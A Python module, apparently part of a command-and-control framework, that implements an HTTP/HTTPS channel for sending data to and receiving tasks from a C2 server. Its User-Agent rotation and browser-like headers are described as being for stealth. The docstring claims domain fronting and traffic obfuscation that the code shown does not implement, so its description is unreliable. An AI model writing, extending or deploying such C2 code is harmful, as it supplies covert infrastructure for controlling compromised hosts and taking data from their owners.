"""
HTTP/HTTPS Protocol for C2 Communication
"""

import asyncio
import httpx
from typing import Dict, Optional
import logging

logger = logging.getLogger(__name__)


class HTTPProtocol:
    """
    HTTP/HTTPS C2 Protocol
    
    Features:
    - Standard HTTP/HTTPS communication
    - Custom headers for stealth
    - User-Agent rotation
    - Domain fronting support
    - Traffic obfuscation
    """
    
    def __init__(self, c2_url: str, use_https: bool = True):
        self.c2_url = c2_url
        self.use_https = use_https
        
        # User agents for rotation
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
        
        self.current_ua_index = 0
    
    def _get_headers(self) -> Dict:
        """Get HTTP headers with rotation"""
        
        headers = {
            "User-Agent": self.user_agents[self.current_ua_index],
            "Accept": "text/html,application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        }
        
        # Rotate user agent
        self.current_ua_index = (self.current_ua_index + 1) % len(self.user_agents)
        
        return headers
    
    async def send(self, endpoint: str, data: Dict, method: str = "POST") -> Optional[Dict]:
        """Send data to C2 server"""
        
        url = f"{self.c2_url}{endpoint}"
        headers = self._get_headers()
        
        try:
            async with httpx.AsyncClient(
                timeout=30.0,
                verify=False if not self.use_https else True
            ) as client:
                
                if method == "POST":
                    response = await client.post(url, json=data, headers=headers)
                elif method == "GET":
                    response = await client.get(url, headers=headers)
                else:
                    raise ValueError(f"Unsupported method: {method}")
                
                if response.status_code == 200:
                    return response.json()
                else:
                    logger.error(f"[HTTPProtocol] Request failed: {response.status_code}")
                    return None
        
        except Exception as e:
            logger.error(f"[HTTPProtocol] Send error: {e}")
            return None
    
    async def receive(self, endpoint: str) -> Optional[Dict]:
        """Receive data from C2 server"""
        
        return await self.send(endpoint, {}, method="GET")


# Standalone test
if __name__ == "__main__":
    async def main():
        protocol = HTTPProtocol("http://localhost:8000")
        result = await protocol.send("/test", {"message": "hello"})
        print(result)
    
    asyncio.run(main())

